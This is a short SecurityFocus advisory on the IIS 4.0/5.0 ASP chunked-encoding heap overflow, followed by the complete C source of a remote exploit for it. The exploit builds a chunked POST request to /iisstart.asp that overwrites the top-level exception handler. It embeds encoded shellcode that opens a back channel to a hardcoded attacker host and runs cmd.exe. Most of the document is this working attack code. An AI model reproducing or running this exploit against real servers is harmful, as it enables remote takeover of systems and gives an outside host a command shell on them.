source: http://www.securityfocus.com/bid/4485/info
 
A heap overflow condition in the 'chunked encoding transfer mechanism' related to Active Server Pages has been reported for Microsoft IIS (Internet Information Services).
 
This condition affects IIS 4.0 and IIS 5.0. Exploitation of this vulnerability may result in a denial of service or allow for a remote attacker to execute arbitrary instructions on the victim host.
 
Microsoft IIS 5.0 is reported to ship with a default script (iisstart.asp) which may be sufficient for a remote attacker to exploit. Other sample scripts may also be exploitable.
 
A number of Cisco products are affected by this vulnerability, although this issue is not present in the Cisco products themselves. 

/*
 IIS5.0 .asp overrun remote exploit
 Programmed by hsj  : 02.04.14

 code flow:
  overrun -> exception -> rewrite top-level handler ->
  exception -> shellcode -> make back channel ->
  exec cmd.exe
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <limits.h>
#include <netdb.h>
#include <arpa/inet.h>

#define RET                 0x0045C560  /* our payload. ugh, direct
jump!!!#$% */
#define REWRITE             0x77eaf44c  /* top-level exception handler */

#define PORT                25
#define ADDR                "attacker.mydomain.co.jp"
#define PORT_OFFSET         518
#define ADDR_OFFSET         523
unsigned char shellcode[]=
/* decoder */
"\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x58\x83\xc0\x1d\x8d\xa0\xf0"
"\xfb\xff\xff\x83\xe4\xfc\x8d\x6c\x24\x10\x33\xc9\x66\xb9\x85\x02"
"\x80\x30\x95\x40\xe2\xfa"
/* code */
"\x7d\x21\x95\x95\x95\xd2\xf0\xe1\xc5\xe7\xfa\xf6\xd4\xf1\xf1\xe7"
"\xf0\xe6\xe6\x95\xd9\xfa\xf4\xf1\xd9\xfc\xf7\xe7\xf4\xe7\xec\xd4"
"\x95\xd6\xe7\xf0\xf4\xe1\xf0\xc5\xfc\xe5\xf0\x95\xd6\xe7\xf0\xf4"
"\xe1\xf0\xc5\xe7\xfa\xf6\xf0\xe6\xe6\xd4\x95\xc5\xf0\xf0\xfe\xdb"
"\xf4\xf8\xf0\xf1\xc5\xfc\xe5\xf0\x95\xc2\xe7\xfc\xe1\xf0\xd3\xfc"
"\xf9\xf0\x95\xc7\xf0\xf4\xf1\xd3\xfc\xf9\xf0\x95\xc6\xf9\xf0\xf0"
"\xe5\x95\xd0\xed\xfc\xe1\xc5\xe7\xfa\xf6\xf0\xe6\xe6\x95\xd6\xf9"
"\xfa\xe6\xf0\xdd\xf4\xfb\xf1\xf9\xf0\x95\xe2\xe6\xa7\xca\xa6\xa7"
"\x95\xc2\xc6\xd4\xc6\xe1\xf4\xe7\xe1\xe0\xe5\x95\xe6\xfa\xf6\xfe"
"\xf0\xe1\x95\xf6\xf9\xfa\xe6\xf0\xe6\xfa\xf6\xfe\xf0\xe1\x95\xf6"
"\xfa\xfb\xfb\xf0\xf6\xe1\x95\xe6\xf0\xfb\xf1\x95\xe7\xf0\xf6\xe3"
"\x95\xf6\xf8\xf1\xbb\xf0\xed\xf0\x95\xcf\xc7\x2e\x95\x95\x65\xe2"
"\x14\xae\xd8\xcf\x05\x95\xe1\x96\xde\x7e\x60\x1e\xe6\xa9\x96\x66"
"\x1e\xe3\xed\x96\x66\x1e\xeb\xb5\x96\x6e\x1e\xdb\x81\xc3\xa6\x55"
"\xc2\xc4\x1e\xaa\x96\x6e\x1e\x67\xa6\x5c\x24\x9b\x66\x33\xcc\xca"
"\xe1\x9d\x16\x52\x91\xd5\x77\x7d\x6a\x74\xcb\x1e\xc3\xb1\x96\x46"
"\x44\x75\x96\x57\xa6\x5c\xf3\x1e\x9d\x1e\xd3\x89\x96\x56\x54\x74"
"\x97\x96\x54\x1e\x85\x96\x46\xcb\x1e\x6b\xa6\x5c\x24\x9c\x7d\xdf"
"\x94\x95\x95\x16\x53\x99\xc7\xc3\x6a\xc2\x49\xcf\x1e\x4d\xa6\x5c"
"\x24\x93\x7d\xa3\x94\x95\x95\x16\x53\x90\x52\xd0\x95\x99\x95\x95"
"\x95\x52\xd0\x91\x95\x95\x95\x95\x52\xd0\x9d\x94\x95\x95\x95\xff"
"\x95\xc0\x18\xd0\x65\xc5\x18\xd0\x61\xc5\x6a\xc2\x5d\xff\x95\xc0"
"\x18\xd0\x6d\xc5\x18\xd0\x69\xc5\x6a\xc2\x5d\xa6\x55\xa6\x5c\x24"
"\x84\xc2\x1e\x68\x66\x3e\xca\x52\xd0\x95\xd1\x95\x95\x95\x1e\xd0"
"\x65\x1c\xd0\xa9\x1c\xd0\xd5\x1e\xd0\x69\x1c\xd0\xad\x52\xd0\xb9"
"\x94\x94\x95\x95\x18\xd0\xd1\xc5\xc0\xc4\xc4\xc4\xd4\xc4\xdc\xc4"
"\xc4\xc3\xc4\x6a\xc2\x59\x6a\xe0\x65\x6a\xc2\x71\x6a\xe0\x69\x6a"
"\xc2\x71\xc0\xfd\x94\x94\x95\x95\x6a\xc2\x7d\x10\x55\x9a\x10\x30"
"\x95\x95\x95\xc5\xd5\xc5\xd5\xc5\x6a\xc2\x79\x16\x6d\x6a\x9a\x11"
"\x01\x95\x95\x95\x1e\x4d\xf3\x52\xd0\x95\x97\x95\xf3\x52\xd0\x97"
"\x2e\x3f\x52\xd0\x91\x48\x59\x2e\x3f\xff\x85\xc0\xc6\x6a\xc2\x61"
"\xff\xa7\x6a\xc2\x49\xa6\x5c\xc4\xc2\xc4\xc4\xc4\x6a\xe0\x61\x6a"
"\xc2\x45\x10\x55\xe1\xcb\x05\x05\x05\x05\x16\xaa\x95\xe1\xba\x05"
"\x05\x05\x05\xff\x95\xc2\xfd\x95\x91\x95\x95\xc0\x6a\xe0\x61\x6a"
"\xc2\x4d\x10\x55\xe1\xab\x05\x05\x05\x05\xff\x95\x6a\xa2\xc0\xc6"
"\x6a\xc2\x6d\x16\x6d\x6a\xe1\xb9\x05\x05\x05\x05\x7e\x27\xff\x95"
"\xfd\x95\x91\x95\x95\xc0\xc6\x6a\xc2\x69\x10\x55\xeb\x83\x05\x05"
"\x05\x05\xff\x95\xc2\xc5\xc0\x6a\xe0\x6d\x6a\xc2\x41\xff\xa7\x6a"
"\xc2\x49\x7e\x19\xc6\x6a\xc2\x65\xff\x95\x6a\xc2\x75\x1f\x93\xd3"
"\x11\x55\xe0\x6c\xc4\xc7\xc3\xc6\x6a\x47\xcf\xcc\x1c\x92\xd2\xd2"
"\xd2\xd2\x77\x7c\x56";

unsigned int resolve(char *name)
{
    struct hostent *he;
    unsigned int ip;

    if((ip=inet_addr(name))==(-1))
    {
        if((he=gethostbyname(name))==0)
            return 0;
        memcpy(&ip,he->h_addr,4);
    }
    return ip;
}

int make_connection(char *address,int port)
{
    struct sockaddr_in server,target;
    int s,i,bf;
    fd_set wd;
    struct timeval tv;

    s = socket(AF_INET,SOCK_STREAM,0);
    if(s<0)
        return -1;
    memset((char *)&server,0,sizeof(server));
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = htonl(INADDR_ANY);
    server.sin_port = 0;

    target.sin_family = AF_INET;
    target.sin_addr.s_addr = resolve(address);
    if(target.sin_addr.s_addr==0)
    {
        close(s);
        return -2;
    }
    target.sin_port = htons(port);
    bf = 1;
    ioctl(s,FIONBIO,&bf);
    tv.tv_sec = 10;
    tv.tv_usec = 0;
    FD_ZERO(&wd);
    FD_SET(s,&wd);
    connect(s,(struct sockaddr *)&target,sizeof(target));
    if((i=select(s+1,0,&wd,0,&tv))==(-1))
    {
        close(s);
        return -3;
    }
    if(i==0)
    {
        close(s);
        return -4;
    }
    i = sizeof(int);
    getsockopt(s,SOL_SOCKET,SO_ERROR,&bf,&i);
    if((bf!=0)||(i!=sizeof(int)))
    {
        close(s);
        errno = bf;
        return -5;
    }
    ioctl(s,FIONBIO,&bf);
    return s;
}

int main(int argc,char *argv[])
{
    int i,j,s;
    unsigned int cb;
    unsigned short port;
    char buf[8192],buf2[16384],path[256];

    if(argc<3)
    {
        printf("usage :$ %s ip port [asp-path]\n",argv[0]);
        return -1;
    }
    if(argc>3)
    {
        strncpy(path,argv[3],sizeof(path));
        path[sizeof(path)-1] = 0;
    }
    else
        strcpy(path,"/iisstart.asp");

    if(!(cb=resolve(ADDR)))
        return -2;

    s = make_connection(argv[1],atoi(argv[2]));
    if(s<0)
    {
        printf("connect error:[%d].\n",s);
        return -3;
    }

    j = strlen(shellcode);
    port = htons(PORT);
    port ^= 0x9595;
    cb ^= 0x95959595;
    *(unsigned short *)&shellcode[PORT_OFFSET] = port;
    *(unsigned int *)&shellcode[ADDR_OFFSET] = cb;
    for(i=0;i<strlen(shellcode);i++)
    {
        if(((shellcode[i]>=0x09)&&(shellcode[i]<=0x0d))||
           (shellcode[i]==0x25)||(shellcode[i]==0x2b)||
           (shellcode[i]==0x3d))
            break;
    }
    if(i!=j)
    {
        printf("bad portno or ip address...\n");
        close(s);
        return -4;
    }

    for(i=0;i<sizeof(buf)-strlen(shellcode)-12-1;)
    {
        buf[i++] = 0xeb;
        buf[i++] = 0x06;
    }
    *(unsigned int *)&buf[i] = 0x41414141;
    *(unsigned int *)&buf[i+4] = 0x41414141;
    *(unsigned int *)&buf[i+8] = 0x41414141;

memcpy(&buf[sizeof(buf)-strlen(shellcode)-1],shellcode,strlen(shellcode));
    buf[sizeof(buf)-1] = 0;
    sprintf(buf2,"POST %s?%s HTTP/1.0\r\n"
                 "Content-Type: application/x-www-form-urlencoded\r\n"
                 "Transfer-Encoding: chunked\r\n\r\n"
                 "10\r\nABCDEFGHIJKLMNOP\r\n"
                 "4\r\nXXXX\r\n"
                 "4\r\nYYYY\r\n"
                 "0\r\n\r\n\r\n",
                 path,buf);
    j = strlen(buf2);
    *(unsigned int *)strstr(buf2,"YYYY") = REWRITE;
    *(unsigned int *)strstr(buf2,"XXXX") = RET;
    write(s,buf2,j);

    printf("---");
    for(i=0;i<j;i++)
    {
        if((i%16)==0)
            printf("\n");
        printf("%02X ",buf2[i]&0xff);
    }
    printf("\n---\n");

    sleep(3);
    shutdown(s,2);
    close(s);

    printf("Done.\n");

    return 0;
}





